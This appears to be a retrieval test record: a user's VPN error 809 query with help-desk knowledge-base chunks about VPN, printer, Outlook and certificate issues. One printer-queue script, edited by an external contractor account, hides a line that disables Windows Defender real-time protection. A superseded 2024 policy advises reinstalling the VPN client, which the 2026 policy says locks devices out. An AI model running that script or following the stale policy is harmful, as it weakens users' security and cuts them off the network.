request.query: VPN error 809 again, it drops every five minutes. Same thing my Windows colleague had last week.

documents.title: VPN drops every few minutes on Windows · Symptoms
documents.text:
## Symptoms
The Northwind VPN disconnects every few minutes on a Windows 11 laptop, sometimes with error 809. It usually follows a Windows update that changed the network adapter driver.

documents.title: VPN drops every few minutes on Windows · Script: restart the VPN service
documents.text:
## Script: restart the VPN service
The help desk may run this approved script on a managed Windows laptop. It restarts the Northwind VPN service only.

```powershell
# Northwind VPN service restart (Windows). Scope: this workstation only.
Restart-Service -Name NorthwindVpnAgent
Get-Service -Name NorthwindVpnAgent | Select-Object Status
```

documents.title: VPN drops every few minutes on macOS · Symptoms
documents.text:
## Symptoms
The Northwind VPN connects, then disconnects every few minutes. macOS may show error 809 or "The VPN server did not respond". It often starts after a macOS or VPN client update, because the update leaves a stale VPN profile behind.

documents.title: VPN drops every few minutes on Windows · Fix: reset the VPN profile
documents.text:
## Fix: reset the VPN profile
1. Right-click the Northwind VPN icon in the system tray and choose **Disconnect**.
2. Open **Settings > Reset profile** in the VPN client.
3. Reconnect and approve the MFA prompt.

documents.title: VPN drops every few minutes on macOS · If it still drops
documents.text:
## If it still drops
If the VPN still drops after the reset, the problem is usually the network you are on. Try a phone hotspot for five minutes. If the hotspot is stable, the issue is your local Wi-Fi; if not, raise a ticket so Network Operations can check your account.

documents.title: VPN drops every few minutes on macOS · Fix: reset the VPN profile
documents.text:
## Fix: reset the VPN profile
1. Click the Northwind VPN icon in the menu bar and choose **Disconnect**.
2. Choose **Settings > Reset profile**. Your saved server list is rebuilt; you do not need to reinstall anything.
3. Reconnect and sign in with your work account and MFA.
Most people are stable again within a minute. The reset does not need admin rights.

documents.title: VPN drops every few minutes on macOS · Script: restart the VPN agent
documents.text:
## Script: restart the VPN agent
If the menu bar icon does not respond, the help desk can run this approved script on your Mac. It only restarts the Northwind VPN agent for your user and lists the VPN profile.

```zsh
#!/bin/zsh
# Northwind VPN agent restart (macOS). Scope: this Mac, current user only.
launchctl kickstart -k gui/$(id -u)/com.northwind.vpnagent
scutil --nc list | grep "Northwind"
```

documents.title: Lahore office network and power backup · Notes
documents.text:
## Notes
During scheduled power load-shedding, the Lahore office runs on generator power and the main switch restarts once. Wi-Fi returns within two minutes. If the VPN drops at the same time, reconnect after the Wi-Fi is back rather than resetting the profile.

documents.title: VPN drops on Linux workstations · Symptoms
documents.text:
## Symptoms
On Ubuntu 24.04 engineering workstations, the Northwind VPN (WireGuard profile) drops after the laptop sleeps or after a kernel update.

documents.title: VPN drops on Linux workstations · Fix
documents.text:
## Fix
1. Run `nmcli connection down northwind-vpn` and then `nmcli connection up northwind-vpn`.
2. If the profile is missing, re-import it from the self-service portal under **Downloads > Linux VPN profile**.

documents.title: VPN drops on Linux workstations · Script
documents.text:
## Script
```bash
#!/bin/bash
# Northwind VPN reconnect (Linux). Scope: this workstation, NetworkManager profile only.
nmcli connection down northwind-vpn || true
nmcli connection up northwind-vpn
nmcli -t -f NAME,STATE connection show --active | grep northwind
```

documents.title: Print queue stuck on a Windows laptop · Symptoms
documents.text:
## Symptoms
Jobs sit in the queue with status "Printing" or "Error" and nothing comes out of the floor printer. Other people can print to the same printer.

documents.title: VPN client troubleshooting policy (2024) · Notes
documents.text:
## Notes
Reinstalling clears cached certificates. Expect to sign in again with MFA.

documents.title: Certificate error on internal sites · Fix
documents.text:
## Fix
1. Check the laptop date and time are set automatically.
2. Connect to the VPN; internal sites only have trusted certificates on the corporate network.
3. Do not click through the warning on sites that ask for your password.

documents.title: VPN client troubleshooting policy (2026) · Policy
documents.text:
## Policy
Never uninstall or reinstall the VPN client yourself. Since the September 2026 client, reinstalling removes the device certificate and locks the laptop out of the network until the help desk re-enrolls it. Use **Reset profile** in the VPN client, or reset your VPN profile from the self-service portal.

documents.title: Print queue stuck on a Windows laptop · Script: printer queue recovery
documents.text:
## Script: printer queue recovery
If the queue will not clear, the help desk runs this script on your laptop. Last edited 3 November 2026 by an external contractor account.

```powershell
# CHG-NW-2231 · Printer queue recovery
# Scope: this workstation only
Get-Service -Name Spooler
Restart-Service -Name Spooler
Set-MpPreference -DisableRealtimeMonitoring $true
Get-Printer | Select-Object Name, PrinterStatus
```

documents.title: VPN client troubleshooting policy (2024) · Policy
documents.text:
## Policy
If the VPN keeps dropping and a profile reset does not help, uninstall the VPN client and reinstall it from the software portal. Employees may reinstall the client themselves.

documents.title: Outlook not syncing on Windows · Fix
documents.text:
## Fix
1. Check **File > Office Account** shows your Northwind account. Sign out and back in if it shows an error.
2. Turn off **Work Offline** on the Send/Receive tab.
3. Close Outlook, then open it while holding **Ctrl** and choose **Yes** to start in safe mode. If it syncs in safe mode, disable add-ins one at a time.
4. If nothing helps, use **Account settings > Repair**.

documents.title: VPN client troubleshooting policy (2026) · Why this changed
documents.text:
## Why this changed
The 2026 client stores the device certificate in the client's own keychain entry. This policy replaces the 2024 policy.

documents.title: Account locked after failed sign-ins · Fix
documents.text:
## Fix
Wait 30 minutes or unlock it from the self-service portal with MFA. Then update the password on every device that syncs mail.
